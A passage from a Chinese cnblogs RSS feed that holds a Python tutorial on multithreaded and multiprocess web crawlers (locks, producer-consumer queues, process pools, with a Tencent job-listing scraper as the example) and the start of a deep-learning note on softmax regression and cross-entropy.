&lt;p&gt;终端模拟器工具就像 IDE 适合自己的才是最好的，如果有其它优秀的开源终端模拟工具欢迎留言告诉我们。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200330202443240-18706838.jpg&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;最后，欢迎留言联系我们、加入我们&lt;em&gt;(^^)&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 31 Mar 2020 00:26:00 +0000</pubDate>
<dc:creator>削微寒</dc:creator>
<og:description>作者： &amp;quot;HelloGitHub ChungZH&amp;quot; 当你逐渐厌倦了 cmd 的枯燥黑屏、powershell 的单调蓝底，可以来尝试一下使用可定制性更高的终端模拟器。下面是 Hel</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xueweihan/p/12600901.html</dc:identifier>
</item>
<item>
<title>多任务爬虫 - 叶落西南</title>
<link>http://www.cnblogs.com/hjnzs/p/12602531.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hjnzs/p/12602531.html</guid>
<description>&lt;h4 id=&quot;一、多任务简介&quot;&gt;一、多任务简介&lt;/h4&gt;
&lt;h5 id=&quot;1、为什么要使用多任务爬虫？&quot;&gt;1、为什么要使用多任务爬虫？&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;在大量的url需要请求时，单线程/单进程去爬取，速度太慢，此时cpu不工作，浪费cpu资源。&lt;/li&gt;
&lt;li&gt;爬取与写入文件分离，可以规避io操作，增加爬取速度，充分利用cpu。&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;2、多任务分类&quot;&gt;2、多任务分类&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;进程：进程是操作资源分配的最小单位，一个运行的程序，至少包括一个进程，进程之间数据不能共享。（利用多核）&lt;/li&gt;
&lt;li&gt;线程：线程是cpu调度的最小单位，一个进程中至少含有一个线程，线程中数据是共享的，如果多个线程操作同一个对象时，需要考虑数据安全问题。（爬虫中最常用）&lt;/li&gt;
&lt;li&gt;协程：协程位于线程内部，如果一个线程中运行的代码，遇到IO操作时，切换到线程其他代码执行（最大程度的规避IO操作）&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;2、如何提高程序的运行速度&quot;&gt;2、如何提高程序的运行速度&lt;/h5&gt;
&lt;h6 id=&quot;1、提高cpu的利用率&quot;&gt;1、提高CPU的利用率&lt;/h6&gt;
&lt;p&gt;假如我们的程序有只有一个线程，CPU就只处理这一个线程。如果在程序中遇到IO操作。此时CPU就不工作了。休息的这段时间，就浪费了CPU的资源。&lt;/p&gt;
&lt;p&gt;若我们的程序是多线程的，CPU会在这多个任务之间切换，如果其中一个线程阻塞了，CPU不会休息，会处理其他线程。&lt;/p&gt;
&lt;h6 id=&quot;2、增加cpu数量&quot;&gt;2、增加CPU数量&lt;/h6&gt;
&lt;p&gt;一个CPU同一时间只能护理一个任务，若我们增加CPU数量，那么多个CPU处理多个任务，也会提升程序的运行速度，例如使用多进程。&lt;/p&gt;
&lt;h4 id=&quot;二、python中的threading模块（开启多线程）&quot;&gt;二、python中的threading模块（开启多线程）&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;cpython&lt;/code&gt;解释器下的 python中没有真正的多线程（因为多个线程不能同时在多核上执行，只能在一个CPU上进行多个线程的切换轮流执行，在视觉效果上看起来同时在执行），造成这个情况的原因是因为GIL（全局性解释器锁），在一个进程中，多个线程是数据共享的，如果不设置全局解释性锁，多个线程可能在同一时间对同一个变量进行操作，造成变量的引用计数不正确，影响其进行垃圾回收，所以需要加全局性解释器锁。&lt;/p&gt;
&lt;h5 id=&quot;21、多线程开启方法&quot;&gt;2.1、多线程开启方法&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;from threading import Thread
1、使用函数
t = Thread(
                                        target=线程执行的任务（方法）名字，
                                        args = 执行方法的参数，是一个元组
                                )---创建线程
t.start()---启动线程

2、使用类
class Mythread(Thread)
        def __init__(self,参数)
                self.参数=参数
                super(Mythread,self).__init__()
        
        def run(self):
                将需要多任务执行的代码，添加到此处

if __name__ == '__main__':
    my =  Mythread(参数)
    my.start()
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;22、线程中常用的几个方法&quot;&gt;2.2、线程中常用的几个方法&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;from threading import Thread, current_thread, enumerate, active_count
import time
import random


class MyThread(Thread):
    def run(self):
        time.sleep(random.random())
        msg = &quot;I'm&quot; + self.name + &quot;@&quot; + str(i)  #self.name 当前线程名
        print(msg)
        print(current_thread().ident)  #当前线程的id号
        print(current_thread().is_alive()) #当前线程是否存活


if __name__ == '__main__':
    t_list=[]
    for i in range(5):
        t = MyThread()
        t.start()
        t_list.append(t)
    while active_count() &amp;gt; 1:  #active_count() 当前存活线程数，包括主线程
        print(enumerate()) #enumerate() 当前存活线程列表，包括主线程
     for i  in t_list:
        i.join() #join方法，会使异步执行的多线程，变为同步执行，主线程会等i线程执行完，才会往下执行。
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;23、守护线程&quot;&gt;2.3、守护线程&lt;/h5&gt;
&lt;p&gt;守护线程，当一个子线程设置为守护线程时，该子线程会等待其他非守护子线程和主线程执行完成后，结束线程。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;from threading import Thread, current_thread
import time


def bar():
    while True:
        time.sleep(1)
        print(current_thread().name)


def foo():
    print(f'{current_thread().name}开始了...')
    time.sleep(2)
    print(f'{current_thread().name}结束了...')


if __name__ == '__main__':
    t1 = Thread(target=bar)
    t1.daemon = True #将t1设置为守护线程，
    t1.start()
    t2 = Thread(target=foo)
    t2.start()

#执行结果
Thread-2开始了...
Thread-1
Thread-1
Thread-2结束了...
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;24、锁&quot;&gt;2.4、锁&lt;/h5&gt;
&lt;p&gt;在使用多线程爬虫的时候，有时候多个线程会对同一个文件进行读写。造成数据不安全，下面是一个Tencent招聘的例子，在写入excel文件中的时候，由于多个线程对同一个文件进行写入操作，造成数据不安全。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;import requests
from jsonpath import jsonpath
from excle_wirte import ExcelUtils
from threading import Thread
import os
from multiprocessing import Lock
import threading

def get_content(url):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'referer': 'https://careers.tencent.com/search.html'
    }
    print(url)
    res = requests.get(url, headers=headers).json()
    jp = jsonpath(res, '$.*.Posts.*')
    return jp


def write_excel(filename, item_list, sheetname):
    if not os.path.exists(filename):
        ExcelUtils.write_to_excel(filename, item_list, sheetname)
    else:
        ExcelUtils.append_to_excel(filename, item_list)


def main(i, lock):
    base_url = 'https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1585401795646&amp;amp;countryId=&amp;amp;cityId=&amp;amp;bgIds=&amp;amp;productId=&amp;amp;categoryId=&amp;amp;parentCategoryId=&amp;amp;attrId=&amp;amp;keyword=&amp;amp;pageIndex={}&amp;amp;pageSize=20&amp;amp;language=zh-cn&amp;amp;area=cn'
    content = get_content(base_url.format(i))
    with lock:   #加锁
        write_excel('tencent.xls', content, 'hr')


if __name__ == '__main__':
    lock = Lock()  #创建锁
    for i in range(1, 11):
        t = Thread(target=main, args=(i, lock))
        t.start()
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;25、生产者与消费者模型&quot;&gt;2.5、生产者与消费者模型&lt;/h5&gt;
&lt;p&gt;生产者和消费者问题是线程模型中的经典问题：生产者和消费者在同一时间段内共用同一个存储空间，生产者往存储空间中添加产品，消费者从存储空间中取走产品，当存储空间为空时，消费者阻塞，当存储空间满时，生产者阻塞。&lt;/p&gt;
&lt;h6 id=&quot;例子：tencent招聘生产者与消费者版本我这里是用函数写的，当然也可以用类来写，会更加方便。&quot;&gt;例子：Tencent招聘生产者与消费者版本,我这里是用函数写的，当然也可以用类来写，会更加方便。&lt;/h6&gt;
&lt;pre&gt;
&lt;code&gt;import requests
from jsonpath import jsonpath
from excle_wirte import ExcelUtils
from threading import Thread
import os
from multiprocessing import Lock
from queue import Queue

flag = False


def ger_url_list(num, url_queue):
    base_url = 'https://careers.tencent.com/tencentcareer/api/post/Query?timestamp=1585401795646&amp;amp;countryId=&amp;amp;cityId=&amp;amp;bgIds=&amp;amp;productId=&amp;amp;categoryId=&amp;amp;parentCategoryId=&amp;amp;attrId=&amp;amp;keyword=&amp;amp;pageIndex={}&amp;amp;pageSize=20&amp;amp;language=zh-cn&amp;amp;area=cn'
    for i in range(1, num + 1):
        url_queue.put(base_url.format(i))


def producer(url_queue, content_queue):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'referer': 'https://careers.tencent.com/search.html'
    }
    while True:
        try:
            url = url_queue.get_nowait()
            res = requests.get(url, headers=headers).json()
            jp = jsonpath(res, '$.*.Posts.*')
            content_queue.put(jp)
        except Exception as e:
            break


def consumer(content_queue, lock, filename, sheetname):
    while True:
        if content_queue.empty() and flag:
            break
        try:
            item_list = content_queue.get_nowait()
            with lock:
                if not os.path.exists(filename):
                    ExcelUtils.write_to_excel(filename, item_list, sheetname)
                else:
                    ExcelUtils.append_to_excel(filename, item_list)
        except Exception as e:
            pass


if __name__ == '__main__':
    p_t_list = []
    url_queue = Queue()   #存放url的队列
    content_queue = Queue()  #网页内容队列
    ger_url_list(10, url_queue)  #往url队列添加url
    lock = Lock() #创建锁对象
    for i in range(4): # 开启四个线程来抓取网页内容
        p_t = Thread(target=producer, args=(url_queue, content_queue))
        p_t.start()
        p_t_list.append(p_t)
    for i in range(4): #四个线程来解析内容和写入文件
        t = Thread(target=consumer, args=(content_queue, lock, 'tencent.xls', 'hr'))
        t.start()
    for i in p_t_list:
        i.join()
    flag=True #判断标志，用来判断生产者是否生产完毕。

&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;26、多进程&quot;&gt;2.6、多进程&lt;/h5&gt;
&lt;p&gt;多进程一般用于处理计算密集型任务，在爬虫方面用的较少，因为多进程开启数量依赖于CPU核心数，且多进程开启操作系统需要为每个进程分配资源，效率不高。这里只简单说明python中使用的库和使用方法，注意进程间不能之间进行数据交换，需要依赖于IPC(Inter-Process Communication)进程间通信，提供了各种进程间通信的方法进行数据交换），常用方法为 队列和管道和Socket。当然还有第三方工具，例如&lt;strong&gt;RabbitMQ&lt;/strong&gt;，&lt;strong&gt;redis&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;from multiprocessing import Process
1、使用函数
t = Thread(
                                        target=进程执行的任务（方法）名字，
                                        args = 执行方法的参数，是一个元组
                                )---创建进程
t.start()---启动进程

2、使用类
class MyProcess(Process)
        def __init__(self,参数)
                self.参数=参数
                super(Mythread,self).__init__()
        
        def run(self):
                将需要多任务执行的代码，添加到此处

if __name__ == '__main__':
    my =  MyProcess(参数)
    my.start()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;multiprocessing&lt;/code&gt;这个库中有很多于多进程相关对象&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;from multiprocessing import Queue, Pipe, Pool,等
Queue：队列 
Pipe：管道
Pool：池（有另外的模块，统一了进程池，线程池的接口，使用更加方便）
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;三、池&quot;&gt;三、池&lt;/h4&gt;
&lt;h5 id=&quot;31、什么是池&quot;&gt;3.1、什么是池&lt;/h5&gt;
&lt;p&gt;池，包括线程池与进程池，一个池内，可以含有指定的线程数，或者是进程数，多个任务，从中拿取线程/进程执行任务，执行完成后，下一个任务再从池中拿取线程/进程。直到所有任务都执行完毕。&lt;/p&gt;
&lt;h5 id=&quot;32、为什么使用池&quot;&gt;3.2、为什么使用池&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;可以比较好的控制开启线程/线程的数量，在提升效率的同时又控制住资源开销。&lt;/li&gt;
&lt;li&gt;可以指定回调函数，很方便的处理返回数据&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;32、池的简单使用，以进程池为例，线程池一样的操作。&quot;&gt;3.2、池的简单使用，以进程池为例，线程池一样的操作。&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor


def fun(i):
    return i ** 2


def pr(con):
    p = con.result()
    print(p)


if __name__ == '__main__':
    p_pool = ProcessPoolExecutor(max_workers=4)  #创建一个含有四个进程的池
    for i in range(10): #10个任务
        p = p_pool.submit(fun, i)  #任务提交
        p.add_done_callback(pr)  #指定回调函数
    p_pool.shutdown()#关闭池
#执行结果
0
1
4
9
16
25
36
49
64
81
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;33、池map方法使用，适合于简单参数&quot;&gt;3.3、池map方法使用，适合于简单参数&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor


def fun(i):
    return i ** 2
   
if __name__ == '__main__':
    p_pool = ProcessPoolExecutor(max_workers=4)
    p = p_pool.map(fun, range(10))
    print(list(p)) #map方法返回的是一个生成器，可通过强转或者循环取值。

#执行结果
[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Mon, 30 Mar 2020 16:47:00 +0000</pubDate>
<dc:creator>叶落西南</dc:creator>
<og:description>一、多任务简介 1、为什么要使用多任务爬虫？ 在大量的url需要请求时，单线程/单进程去爬取，速度太慢，此时cpu不工作，浪费cpu资源。 爬取与写入文件分离，可以规避io操作，增加爬取速度，充分利用</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/hjnzs/p/12602531.html</dc:identifier>
</item>
<item>
<title>家乐的深度学习笔记「4」 - softmax回归 - Licsber</title>
<link>http://www.cnblogs.com/licsber/p/MXNet-4.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/licsber/p/MXNet-4.html</guid>
<description>&lt;p&gt;softmax模型、softmax运算、交叉熵损失函数、最大似然估计、Batch_size的合理选取&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;509.22393999694&quot;&gt;

&lt;h2 id=&quot;softmax回归&quot;&gt;softmax回归&lt;/h2&gt;
&lt;p&gt;线性回归模型适用于输出为连续值的情景，而softmax回归的输出单元由一个变成了多个，且引入了softmax运算输出类别的概率分布，使输出更适合离散值的预测与训练，模型输出可以是一个像图像类别这样的离散值，其是一个单层神经网络，输出个数等于分类问题中的类别个数。&lt;/p&gt;
&lt;h3 id=&quot;分类问题&quot;&gt;分类问题&lt;/h3&gt;
&lt;p&gt;考虑一个简单的图像分类问题，其输入图像的宽和高均为2像素，且色彩为灰度。这样每个像素值都可以用一个标量表示。将图像中的4像素分别记为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/5128092ad6654b0601b029e7e14c3edb.svg#card=math&amp;amp;code=x_1%2C%20x_2%2C%20x_3%2C%20x_4&amp;amp;height=15&amp;amp;width=94&quot; alt=&quot;&quot;/&gt;，假设训练数据集中图像的真实标签为🐶、🐱或🐔，这些标签分别对应离散值&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/d5baf62d7d906cc364467fe12782deeb.svg#card=math&amp;amp;code=y_1%2C%20y_2%2C%20y_3&amp;amp;height=15&amp;amp;width=65&quot; alt=&quot;&quot;/&gt;。&lt;br/&gt;通常使用离散的数值来表示类别，例如&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/5cc981d5484cc44ce8cb5d2b1a0f7e18.svg#card=math&amp;amp;code=y_1%3D1%2C%20y_2%3D2%2C%20y_3%3D3&amp;amp;height=18&amp;amp;width=154&quot; alt=&quot;&quot;/&gt;。如此，一张图像的标签为1、2和3这3个数值中的一个。虽然仍可以使用回归模型来进行建模，并将预测值就近定点化到1、2和3这3个离散值之一，但这种连续值到离散值的转换通常会影响到分类质量。因此一般使用更加适合离散值输出的模型来解决分类问题。&lt;/p&gt;
&lt;h3 id=&quot;softmax回归模型&quot;&gt;softmax回归模型&lt;/h3&gt;
&lt;p&gt;softmax与线性回归一样将输入特征与权重做线性叠加。其输出值个数等于标签里的类别数。由于每个输出的计算都要依赖于所有的输入，所以其输出层也是一个全连接层。&lt;/p&gt;
&lt;h4 id=&quot;softmax运算&quot;&gt;softmax运算&lt;/h4&gt;
&lt;p&gt;假如将输出值&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/c02c4a71b77353b6618d5fb75c880ad7.svg#card=math&amp;amp;code=o_i&amp;amp;height=15&amp;amp;width=14&quot; alt=&quot;&quot;/&gt;当作预测类别是&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/865c0c0b4ab0e063e5caa3387c1a8741.svg#card=math&amp;amp;code=i&amp;amp;height=16&amp;amp;width=6&quot; alt=&quot;&quot;/&gt;的置信度，并将值最大的输出所对应的类作为预测输出，即输出&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/6b0d6762630f435343a9843308bb67d5.svg#card=math&amp;amp;code=%5Ctext%7Bargmax%7D_io_i&amp;amp;height=16&amp;amp;width=76&quot; alt=&quot;&quot;/&gt;，会存在两个问题：其一，由于输出层的输出值的范围不确定，很难直观上判断这些值的意义；另一方面，由于真实标签为离散值，这些离散值与不确定范围的输出值之间的误差难以衡量。&lt;br/&gt;于是我们拥有了softmax运算，将输出值变换成值为正且和为1的概率分布：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/81fb5ebc5c5a31b46b25d577d71e8e02.svg#card=math&amp;amp;code=%5Chat%7By%7D_1%2C%20%5Chat%7By%7D_2%2C%20%5Chat%7By%7D_3%20%3D%20%5Ctext%7Bsoftmax%7D%28o_1%2C%20o_2%2C%20o_3%29&amp;amp;height=21&amp;amp;width=227&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/ddbc8540bf6a180b23deaaa0ede42bd1.svg#card=math&amp;amp;code=%5Chat%7By%7D_1%20%3D%20%5Cfrac%7B%20%5Cexp%28o_1%29%7D%7B%5Csum_%7Bi%3D1%7D%5E3%20%5Cexp%28o_i%29%7D%2C%5Cquad%0A%5Chat%7By%7D_2%20%3D%20%5Cfrac%7B%20%5Cexp%28o_2%29%7D%7B%5Csum_%7Bi%3D1%7D%5E3%20%5Cexp%28o_i%29%7D%2C%5Cquad%0A%5Chat%7By%7D_3%20%3D%20%5Cfrac%7B%20%5Cexp%28o_3%29%7D%7B%5Csum_%7Bi%3D1%7D%5E3%20%5Cexp%28o_i%29%7D&amp;amp;height=51&amp;amp;width=471&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样输出值就是一个合法的概率分布，其值还可以直接代表该类别的概率，并且不改变预测类别输出。&lt;/p&gt;
&lt;h3 id=&quot;矢量表达式&quot;&gt;矢量表达式&lt;/h3&gt;
&lt;h4 id=&quot;单样本分类的矢量计算表达式&quot;&gt;单样本分类的矢量计算表达式&lt;/h4&gt;
&lt;p&gt;可以将原图像样本&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/865c0c0b4ab0e063e5caa3387c1a8741.svg#card=math&amp;amp;code=i&amp;amp;height=16&amp;amp;width=6&quot; alt=&quot;&quot;/&gt;视为一整个行向量，即：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/ac214e4a9b9a526e47554301e7045ba0.svg#card=math&amp;amp;code=%5Cboldsymbol%7Bx%7D%5E%7B%28i%29%7D%20%3D%20%5Cbegin%7Bbmatrix%7Dx_1%5E%7B%28i%29%7D%20%26%20x_2%5E%7B%28i%29%7D%20%26%20x_3%5E%7B%28i%29%7D%20%26%20x_4%5E%7B%28i%29%7D%5Cend%7Bbmatrix%7D&amp;amp;height=35&amp;amp;width=219&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;则权重项和偏差参数分别为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/983a4d54b1cc194a85d47927b17ced8e.svg#card=math&amp;amp;code=%5Cboldsymbol%7BW%7D%20%3D%20%0A%5Cbegin%7Bbmatrix%7D%0A%20%20%20%20w_%7B11%7D%20%26%20w_%7B12%7D%20%26%20w_%7B13%7D%20%5C%5C%0A%20%20%20%20w_%7B21%7D%20%26%20w_%7B22%7D%20%26%20w_%7B23%7D%20%5C%5C%0A%20%20%20%20w_%7B31%7D%20%26%20w_%7B32%7D%20%26%20w_%7B33%7D%20%5C%5C%0A%20%20%20%20w_%7B41%7D%20%26%20w_%7B42%7D%20%26%20w_%7B43%7D%0A%5Cend%7Bbmatrix%7D%2C%5Cquad%0A%5Cboldsymbol%7Bb%7D%20%3D%20%0A%5Cbegin%7Bbmatrix%7D%0A%20%20%20%20b_1%20%26%20b_2%20%26%20b_3%0A%5Cend%7Bbmatrix%7D&amp;amp;height=90&amp;amp;width=330&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输出层略（为一行向量），则softmax回归对样本&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/865c0c0b4ab0e063e5caa3387c1a8741.svg#card=math&amp;amp;code=i&amp;amp;height=16&amp;amp;width=6&quot; alt=&quot;&quot;/&gt;分类的矢量计算表达式为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/e28be83c3c0c9eb3334accbcbbab9d96.svg#card=math&amp;amp;code=%5Cbegin%7Baligned%7D%0A%5Cboldsymbol%7Bo%7D%5E%7B%28i%29%7D%20%26%3D%20%5Cboldsymbol%7Bx%7D%5E%7B%28i%29%7D%20%5Cboldsymbol%7BW%7D%20%2B%20%5Cboldsymbol%7Bb%7D%2C%5C%5C%0A%5Cboldsymbol%7B%5Chat%7By%7D%7D%5E%7B%28i%29%7D%20%26%3D%20%5Ctext%7Bsoftmax%7D%28%5Cboldsymbol%7Bo%7D%5E%7B%28i%29%7D%29%0A%5Cend%7Baligned%7D&amp;amp;height=50&amp;amp;width=151&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;小批量样本分类的矢量计算表达式&quot;&gt;小批量样本分类的矢量计算表达式&lt;/h4&gt;
&lt;p&gt;为了进一步提升效率，可以从把多个单样本组成小批量数据。广义上讲，给定一个小批量样本，其批量大小为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/7b8b965ad4bca0e41ab51de7b31363a1.svg#card=math&amp;amp;code=n&amp;amp;height=13&amp;amp;width=11&quot; alt=&quot;&quot;/&gt;，输入个数（特征数）为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/8277e0910d750195b448797616e091ad.svg#card=math&amp;amp;code=d&amp;amp;height=16&amp;amp;width=9&quot; alt=&quot;&quot;/&gt;，输出个数（类别数）为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/7694f4a66316e53c8cdd9d9954bd611d.svg#card=math&amp;amp;code=q&amp;amp;height=15&amp;amp;width=8&quot; alt=&quot;&quot;/&gt;。设批量特征为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/28621943d2e6aae4de940f7b0b6a2de5.svg#card=math&amp;amp;code=%5Cboldsymbol%7BX%7D%20%5Cin%20%5Cmathbb%7BR%7D%5E%7Bn%20%5Ctimes%20d%7D&amp;amp;height=20&amp;amp;width=75&quot; alt=&quot;&quot;/&gt;。假设softmax回归的权重和偏差参数分别为&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/0237eb2591dd29a5b888096c0b2f10c6.svg#card=math&amp;amp;code=%5Cboldsymbol%7BW%7D%20%5Cin%20%5Cmathbb%7BR%7D%5E%7Bd%20%5Ctimes%20q%7D&amp;amp;height=20&amp;amp;width=78&quot; alt=&quot;&quot;/&gt;和&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/9674422f74f5447f886753d9bb22d7da.svg#card=math&amp;amp;code=%5Cboldsymbol%7Bb%7D%20%5Cin%20%5Cmathbb%7BR%7D%5E%7B1%20%5Ctimes%20q%7D&amp;amp;height=20&amp;amp;width=66&quot; alt=&quot;&quot;/&gt;。softmax回归的矢量计算表达式为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/504aeb7eb64a7a48e5673d1ee6dfb085.svg#card=math&amp;amp;code=%5Cbegin%7Baligned%7D%0A%5Cboldsymbol%7BO%7D%20%26%3D%20%5Cboldsymbol%7BX%7D%20%5Cboldsymbol%7BW%7D%20%2B%20%5Cboldsymbol%7Bb%7D%2C%5C%5C%0A%5Cboldsymbol%7B%5Chat%7BY%7D%7D%20%26%3D%20%5Ctext%7Bsoftmax%7D%28%5Cboldsymbol%7BO%7D%29%0A%5Cend%7Baligned%7D&amp;amp;height=47&amp;amp;width=128&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中加法运算使用了广播机制，&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/7706daa605cf4fc344bd5f2a8c935bea.svg#card=math&amp;amp;code=%5Cboldsymbol%7BO%7D%2C%20%5Cboldsymbol%7B%5Chat%7BY%7D%7D%20%5Cin%20%5Cmathbb%7BR%7D%5E%7Bn%20%5Ctimes%20q%7D&amp;amp;height=23&amp;amp;width=93&quot; alt=&quot;&quot;/&gt;且这两个矩阵的第&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/865c0c0b4ab0e063e5caa3387c1a8741.svg#card=math&amp;amp;code=i&amp;amp;height=16&amp;amp;width=6&quot; alt=&quot;&quot;/&gt;行分别为样本&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/865c0c0b4ab0e063e5caa3387c1a8741.svg#card=math&amp;amp;code=i&amp;amp;height=16&amp;amp;width=6&quot; alt=&quot;&quot;/&gt;的输出&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/fbbaa175ba63d58ebeaa702c72930603.svg#card=math&amp;amp;code=%5Cboldsymbol%7Bo%7D%5E%7B%28i%29%7D&amp;amp;height=21&amp;amp;width=25&quot; alt=&quot;&quot;/&gt;和概率分布&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/68f21e546fa00043b779acfa438947c9.svg#card=math&amp;amp;code=%5Cboldsymbol%7B%5Chat%7By%7D%7D%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=26&quot; alt=&quot;&quot;/&gt;。&lt;/p&gt;
&lt;h3 id=&quot;交叉熵损失函数&quot;&gt;交叉熵损失函数&lt;/h3&gt;
&lt;p&gt;softmax运算将输出变换成一个合法的类别预测分布，而真实标签也可以用类别分布表达：对于样本&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/865c0c0b4ab0e063e5caa3387c1a8741.svg#card=math&amp;amp;code=i&amp;amp;height=16&amp;amp;width=6&quot; alt=&quot;&quot;/&gt;，我们构造向量&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/abee18cc8e04ededa6c054d3980334b8.svg#card=math&amp;amp;code=%5Cboldsymbol%7By%7D%5E%7B%28i%29%7D%5Cin%20%5Cmathbb%7BR%7D%5E%7Bq%7D&amp;amp;height=23&amp;amp;width=65&quot; alt=&quot;&quot;/&gt;（&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/7694f4a66316e53c8cdd9d9954bd611d.svg#card=math&amp;amp;code=q&amp;amp;height=15&amp;amp;width=8&quot; alt=&quot;&quot;/&gt;为前文提到的输出个数（类别数）），使其第&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/4be66ad2cf5c98540db20bd7df0c0413.svg#card=math&amp;amp;code=y%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=23&quot; alt=&quot;&quot;/&gt;个（样本i类别的离散数值）个元素为1，其余为0。这样训练目标就可以设为使预测概率分布&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/9d8daaba5ca595670b5abe8a27a5a396.svg#card=math&amp;amp;code=%5Cboldsymbol%7B%5Chat%20y%7D%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=26&quot; alt=&quot;&quot;/&gt;尽可能接近真实的标签概率分布&lt;img src=&quot;https://cdn.nlark.com/yuque/__latex/16aed2c267b3eeb69cbc6313aca996d1.svg#card=math&amp;amp;code=%5Cboldsymbol%7By%7D%5E%7B%28i%29%7D&amp;amp;height=23&amp;amp;width=25&quot; alt=&quot;&quot;/&gt;。&lt;br/&gt;家乐：即构造的向量也是一个合法的概率分布，只不过只存在一个尖峰，下面的对比差异就容易理解了。&lt;br/&gt;可以像线性回归那样使用平方损失函数（L2损失），然而，想要预测分类结果正确，其实并不需要预测概率完全等于标签概率。如在图像分类问题中，只需要某类别预测值大于其他所有预测值即可，而平方损失就会过于严格。&lt;br/&gt;于是可以使用更适合衡量两个概率分布差异的测量函数。其中，&lt;strong&gt;交叉熵&lt;/strong&gt;（cross entropy）是一个常用的衡量方法：&lt;/p&gt;
